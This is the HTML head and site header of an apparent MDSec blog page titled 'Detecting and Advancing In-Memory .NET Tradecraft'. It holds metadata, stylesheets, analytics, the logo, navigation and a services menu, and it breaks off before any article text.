
<!DOCTYPE html>
<!--[if lt IE 7 ]><html lang="en-GB" class="no-js ie ie6 lte7 lte8 lte9"><![endif]-->
<!--[if IE 7 ]><html lang="en-GB" class="no-js ie ie7 lte7 lte8 lte9"><![endif]-->
<!--[if IE 8 ]><html lang="en-GB" class="no-js ie ie8 lte8 lte9"><![endif]-->
<!--[if IE 9 ]><html lang="en-GB" class="no-js ie ie9 lte9"><![endif]-->
<!--[if (gt IE 9)|!(IE)]><!--><html lang="en-GB" class="no-js"><!--<![endif]-->
<head>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-67981177-1" type="a1e5d288847e28772d429a79-text/javascript"></script>
<script type="a1e5d288847e28772d429a79-text/javascript">
	  		window.dataLayer = window.dataLayer || [];
	  		function gtag(){dataLayer.push(arguments);}
	  		gtag('js', new Date());

	  		gtag('config', 'UA-67981177-1');
		</script>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>Detecting and Advancing In-Memory .NET Tradecraft - MDSec</title>

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />

<link rel="apple-touch-icon" sizes="57x57" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/manifest.json">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">



<link rel="stylesheet" href="https://use.typekit.net/icv6vdt.css">
<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1" />

<link rel="canonical" href="https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/" />
<meta property="og:locale" content="en_GB" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Detecting and Advancing In-Memory .NET Tradecraft - MDSec" />
<meta property="og:description" content="Introduction In-memory tradecraft is becoming more and more important for remaining undetected during a red team operation, with it becoming common practice for blue teams to peek in to running..." />
<meta property="og:url" content="https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/" />
<meta property="og:site_name" content="MDSec" />
<meta property="article:published_time" content="2020-06-10T10:34:20+00:00" />
<meta property="article:modified_time" content="2020-09-05T20:07:22+00:00" />
<meta property="og:image" content="https://www.mdsec.co.uk/wp-content/uploads/2019/11/tim-van-der-kuip-CPs2X8JYmS8-unsplash.jpg" />
<meta property="og:image:width" content="1000" />
<meta property="og:image:height" content="667" />
<meta property="og:image:type" content="image/jpeg" />
<meta name="author" content="Admin" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:creator" content="@mdseclabs" />
<meta name="twitter:site" content="@mdseclabs" />
<meta name="twitter:label1" content="Written by" />
<meta name="twitter:data1" content="Admin" />
<meta name="twitter:label2" content="Estimated reading time" />
<meta name="twitter:data2" content="13 minutes" />
<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/#article","isPartOf":{"@id":"https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/"},"author":{"name":"Admin","@id":"https://www.mdsec.co.uk/#/schema/person/17b494d22ae189270c1e0e41b25fcae3"},"headline":"Detecting and Advancing In-Memory .NET Tradecraft","datePublished":"2020-06-10T10:34:20+00:00","dateModified":"2020-09-05T20:07:22+00:00","mainEntityOfPage":{"@id":"https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/"},"wordCount":1873,"publisher":{"@id":"https://www.mdsec.co.uk/#organization"},"image":{"@id":"https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/#primaryimage"},"thumbnailUrl":"https://www.mdsec.co.uk/wp-content/uploads/2019/11/tim-van-der-kuip-CPs2X8JYmS8-unsplash.jpg","articleSection":["ActiveBreach","Adversary Simulation","All","Exploitation","Red Team"],"inLanguage":"en-GB"},{"@type":"WebPage","@id":"https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/","url":"https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/","name":"Detecting and Advancing In-Memory .NET Tradecraft - MDSec","isPartOf":{"@id":"https://www.mdsec.co.uk/#website"},"primaryImageOfPage":{"@id":"https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/#primaryimage"},"image":{"@id":"https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/#primaryimage"},"thumbnailUrl":"https://www.mdsec.co.uk/wp-content/uploads/2019/11/tim-van-der-kuip-CPs2X8JYmS8-unsplash.jpg","datePublished":"2020-06-10T10:34:20+00:00","dateModified":"2020-09-05T20:07:22+00:00","breadcrumb":{"@id":"https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/#breadcrumb"},"inLanguage":"en-GB","potentialAction":[{"@type":"ReadAction","target":["https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/"]}]},{"@type":"ImageObject","inLanguage":"en-GB","@id":"https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/#primaryimage","url":"https://www.mdsec.co.uk/wp-content/uploads/2019/11/tim-van-der-kuip-CPs2X8JYmS8-unsplash.jpg","contentUrl":"https://www.mdsec.co.uk/wp-content/uploads/2019/11/tim-van-der-kuip-CPs2X8JYmS8-unsplash.jpg","width":1000,"height":667},{"@type":"BreadcrumbList","@id":"https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://www.mdsec.co.uk/"},{"@type":"ListItem","position":2,"name":"Detecting and Advancing In-Memory .NET Tradecraft"}]},{"@type":"WebSite","@id":"https://www.mdsec.co.uk/#website","url":"https://www.mdsec.co.uk/","name":"MDSec","description":"Unrivalled Security Consulting &amp; Training","publisher":{"@id":"https://www.mdsec.co.uk/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://www.mdsec.co.uk/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-GB"},{"@type":"Organization","@id":"https://www.mdsec.co.uk/#organization","name":"MDSec","url":"https://www.mdsec.co.uk/","logo":{"@type":"ImageObject","inLanguage":"en-GB","@id":"https://www.mdsec.co.uk/#/schema/logo/image/","url":"https://www.mdsec.co.uk/wp-content/uploads/2020/08/MDSec-Logo-Blue.png","contentUrl":"https://www.mdsec.co.uk/wp-content/uploads/2020/08/MDSec-Logo-Blue.png","width":1500,"height":1000,"caption":"MDSec"},"image":{"@id":"https://www.mdsec.co.uk/#/schema/logo/image/"},"sameAs":["https://x.com/mdseclabs"]},{"@type":"Person","@id":"https://www.mdsec.co.uk/#/schema/person/17b494d22ae189270c1e0e41b25fcae3","name":"Admin","image":{"@type":"ImageObject","inLanguage":"en-GB","@id":"https://www.mdsec.co.uk/#/schema/person/image/","url":"https://secure.gravatar.com/avatar/ea6be35ff31bf7eba02c999d1d41eff2?s=96&d=wp_user_avatar&r=g","contentUrl":"https://secure.gravatar.com/avatar/ea6be35ff31bf7eba02c999d1d41eff2?s=96&d=wp_user_avatar&r=g","caption":"Admin"},"sameAs":["https://x.com/mdseclabs"],"url":"https://www.mdsec.co.uk/author/dominic/"}]}</script>

<link rel="stylesheet" id="wp-block-library-css" href="https://www.mdsec.co.uk/wp-includes/css/dist/block-library/style.min.css?ver=4ad7710adfef1562cb3ced840a1098b2" type="text/css" media="all" />
<style id="classic-theme-styles-inline-css" type="text/css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id="global-styles-inline-css" type="text/css">
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="taxonomy-image-plugin-public-css" href="https://www.mdsec.co.uk/wp-content/plugins/taxonomy-images/css/style.css?ver=0.9.6" type="text/css" media="screen" />
<link rel="stylesheet" id="style-css" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/css/style.css?ver=1.1.5" type="text/css" media="all" />
<link rel="stylesheet" id="prism-css-css" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/css/solarized_dark.css?ver=1" type="text/css" media="all" />
<link rel="stylesheet" id="flickity-css-css" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/css/flickity.min.css?ver=1" type="text/css" media="all" />
<link rel="stylesheet" id="hamburger-css-css" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/css/hamburgers.css?ver=1" type="text/css" media="all" />
<link rel="stylesheet" id="font-awesome-css" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/css/font-awesome.min.css?ver=4ad7710adfef1562cb3ced840a1098b2" type="text/css" media="all" />
<!--[if lt IE 9]>
<script type="text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/html5shiv.js?ver=3.7.3" id="html5js-js"></script>
<![endif]-->
<!--[if lt IE 9]>
<script type="text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/respond.js?ver=1.3.1" id="respond-script-js"></script>
<![endif]-->
<!--[if lt IE 9]>
<script type="text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/selectivizr-min.js?ver=1.0.2" id="selectivizr-script-js"></script>
<![endif]-->
<link rel="https://api.w.org/" href="https://www.mdsec.co.uk/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://www.mdsec.co.uk/wp-json/wp/v2/posts/1972" /><link rel="shortlink" href="https://www.mdsec.co.uk/?p=1972" />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.mdsec.co.uk/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.mdsec.co.uk%2F2020%2F06%2Fdetecting-and-advancing-in-memory-net-tradecraft%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.mdsec.co.uk/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.mdsec.co.uk%2F2020%2F06%2Fdetecting-and-advancing-in-memory-net-tradecraft%2F&#038;format=xml" />
<style type="text/css" id="wp-custom-css">
			.insights-content p
{
	font-family: titling-gothic-fb,sans-serif;
	color: #777a85;
}

.insights-content ul li
{
	font-family: titling-gothic-fb,sans-serif;
color: #777a85;
}


.insights-content h2
{
	font-family: fabrikat_mono_regular;
	font-weight: bold;
}

.insights-content figure
{
	justify-content: center;
}

.insights-content .wp-block-code code {
    max-width: 1000px;
    display: block;
    overflow-x: auto;
    color: #839496;
    margin: 0 auto;
    -webkit-text-size-adjust: none;
    font-size: 1.3rem;
    line-height: 20px;
		padding: 2px 0px;
}		</style>
</head>
<body class="post-template-default single single-post postid-1972 single-format-standard">
<!--[if lt IE 7]>
        <div class="browse-happy">
        	 <a href="https://www.mdsec.co.uk">
				<div id="logo">Logo</div>
			</a>
        	<p>You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
        </div>    	
    <![endif]-->

<div class="site-wrapper">

<header class="clearfix">
<div class="logo">
<a href="https://www.mdsec.co.uk" title="MDSec">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 188.3 50" style="enable-background:new 0 0 188.3 50;" xml:space="preserve">
<g>
<g>
<path class="st0" d="M71.3,49.7V33.1l-7.7,16.5h-5.9l-7.5-16.5v16.5h-5.7V24.9h7.7l8.5,18.9l8.7-18.9H77v24.8H71.3z" />
<path class="st0" d="M95.8,49.7H80V24.9h15.6c5.7,0,9,1.6,10.6,4.4c1.2,1.8,1.6,4,1.6,7.6c0,3.9-0.4,6.1-1.5,8
							C104.7,47.9,101.4,49.7,95.8,49.7z M101.9,37c0-2.1-0.3-3.9-1-4.8c-1.1-1.7-2.9-2.5-6.2-2.5H86v15h8.6c3.4,0,5.3-0.8,6.4-2.4
							C101.7,41.3,101.9,39.3,101.9,37z" />
<path class="st0" d="M125.2,50c-8.7,0-13.1-2.8-13.4-7.9h2.8c0.2,3.7,4.1,5.4,10.6,5.4c6.9,0,9.3-1.8,9.3-4.5c0-2.9-2.1-4.1-9.9-5
							c-5.9-0.7-12.3-1.4-12.3-6.8c0-3.6,3.1-6.7,11.8-6.7c8.5,0,11.9,3.5,12.7,7.3h-2.9c-0.7-2.9-3.5-4.8-9.9-4.8
							c-6.3,0-8.9,1.7-8.9,4.1c0,3.4,4.9,3.9,10.1,4.4c7.5,0.8,12.1,2.1,12.1,7.2C137.3,47.2,133.8,50,125.2,50z" />
<path class="st0" d="M151.9,50c-7.3,0-11.6-2.8-11.6-9.2c0-5.8,4.3-8.9,11.5-8.9c8.1,0,11.7,4,11.4,10h-20.3c0.1,3.8,3.5,6,9.2,6
							c5.9,0,7.9-2.2,8.3-3.5h2.6C162.2,47.2,159.3,50,151.9,50z M151.7,34c-5.8,0-8.9,2.3-8.9,5.8h17.7C160.5,36.4,157.9,34,151.7,34z" />
<path class="st0" d="M185.7,38.5c-0.1-0.8-0.3-1.4-0.9-2c-1.2-1.4-3.7-2.4-7.4-2.4c-3.8,0-6.4,0.9-7.9,2.7c-0.9,1-1.2,2.4-1.2,4.2
							c0,1.9,0.4,3.3,1.3,4.3c1.4,1.7,4.1,2.5,7.9,2.5c3.7,0,5.9-0.7,7.2-1.9c0.6-0.6,1-1.5,1.1-2.2h2.6c-0.2,1.3-0.7,2.6-1.6,3.5
							C185,49,182,50,177.3,50c-4.8,0-8.1-1.1-9.9-3.3c-1.2-1.4-1.8-3.3-1.8-5.8c0-2.3,0.6-4.2,1.7-5.6c1.9-2.2,5.3-3.5,9.9-3.5
							c5.3,0,8.4,1.5,9.8,3.5c0.8,1,1,2.1,1.1,3.2H185.7z" />
</g>
<path class="st0" d="M31,44.1H2c-1.1,0-2,0.9-2,2v3.5h32.9V46C32.9,45,32,44.1,31,44.1z" />
<path class="st0" d="M19.5,19.2l0.3,0c0.9-0.1,1.6-0.4,2.3-0.9l0,0l3,2.5c0.3,0.3,0.7,0.5,1.1,0.6c1.2,0.3,2.4-0.2,3-1.2l1.8-1.9
						c0.3-0.3,0.3-0.7,0.1-1l-5.4-7.5C25.2,9.3,25,8.6,24.8,8c-0.2-1.1-0.9-2-1.9-2.5l-3.7-1.9l2.5-2.5l0,0c0,0-0.1-0.1-0.1-0.1
						c-0.6-0.6-1.4-1-2.3-1c-0.6,0-1.1,0.1-1.6,0.4l0,0l-7.7,3.3l0,0c-4.7,2-8,6.7-8,12.1v2L5.9,14v2.7L2,20.5v2.7l3.8-3.8v2.7L2,25.9
						v2.7l3.8-3.8v2.7L2,31.4v1.7h3.9L2,37V42H31v-0.7c0-7.7-3.2-12.2-6.5-14.4c-2.4-1.6-8.1-3.3-8.1-8.4c0.8,0.5,1.8,0.8,2.8,0.8
						C19.3,19.2,19.4,19.2,19.5,19.2z" />
</g>
</svg>
</a>
</div>

<nav role="navigation" class="main-navigation" id="main-navigation">
<ul id="menu-main-navigation" class="clearfix"><li id="menu-item-367" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-367"><a href="#">Our Services</a></li>
<li id="menu-item-368" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-368"><a href="#">Knowledge Centre</a></li>
<li id="menu-item-19" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-19"><a href="https://www.mdsec.co.uk/about/">About</a></li>
<li id="menu-item-20" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-20"><a href="https://www.mdsec.co.uk/contact/">Contact</a></li>
</ul> </nav>


<nav role="navigation" class="mobile-navigation" id="mobile-navigation">
<ul id="menu-mobile-navigation" class="clearfix"><li id="menu-item-373" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-373"><a href="#">Our Services</a>
<ul class="sub-menu">
<li id="menu-item-374" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-374"><a href="https://www.mdsec.co.uk/our-services/adversary-simulation/">Adversary Simulation</a></li>
<li id="menu-item-375" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-375"><a href="https://www.mdsec.co.uk/our-services/application-security/">Application Security</a></li>
<li id="menu-item-376" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-376"><a href="https://www.mdsec.co.uk/our-services/penetration-testing/">Penetration Testing</a></li>
<li id="menu-item-377" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-377"><a href="https://www.mdsec.co.uk/our-services/response/">Response</a></li>
</ul>
</li>
<li id="menu-item-378" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-378"><a href="#">Knowledge Centre</a>
<ul class="sub-menu">
<li id="menu-item-379" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-379"><a href="https://www.mdsec.co.uk/knowledge-centre/insights/">Insights</a></li>
<li id="menu-item-380" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-380"><a href="https://www.mdsec.co.uk/knowledge-centre/research/">Research</a></li>
<li id="menu-item-381" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-381"><a href="https://www.mdsec.co.uk/knowledge-centre/training/">Training</a></li>
</ul>
</li>
<li id="menu-item-371" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-371"><a href="https://www.mdsec.co.uk/about/">About</a></li>
<li id="menu-item-372" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-372"><a href="https://www.mdsec.co.uk/contact/">Contact</a></li>
</ul> </nav>

<div class="menu-toggle">
<button class="hamburger hamburger--slider" type="button">
<span class="hamburger-box">
<span class="hamburger-inner"></span>
</span>
</button>
</div>
</header>

<div class="subnav">
<section class="content-wrapper">
<ul class="service-list clearfix">
<li class="item">
<a href="https://www.mdsec.co.uk/our-services/adversary-simulation/">
<div class="service-icon">
<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-adversary.svg" alt="Adversary">
</div>
<hgroup>
<h2>
Adversary Simulation
</h2>
</hgroup>
<p>Our best in class red team can deliver a holistic cyber attack simulation to provide a true evaluation of your organisation&#8217;s cyber resilience.</p>
</a>
</li>
<li class="item">
<a href="https://www.mdsec.co.uk/our-services/applicaton-security/">
<div class="service-icon">
<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-application-security.svg" alt="Application Security">
</div>
<hgroup>
<h2>
Application <br>Security
</h2>
</hgroup>
<p>Leverage the team behind the industry-leading Web Application and Mobile Hacker’s Handbook series.</p>
</a>
</li>
<li class="item">
<a href="https://www.mdsec.co.uk/our-services/penetration-testing/">
<div class="service-icon">
<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-penetration-testing.svg" alt="Penetration Testing">
</div>
<hgroup>
<h2>
Penetration <br>Testing
</h2>
</hgroup>
<p>MDSec’s penetration testing team is trusted by companies from the world’s leading technology firms to global financial institutions.</p>
</a>
</li>
<li class="item">
<a href="https://www.mdsec.co.uk/our-services/response/">
<div class="service-icon">
<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-response.svg" alt="Response">
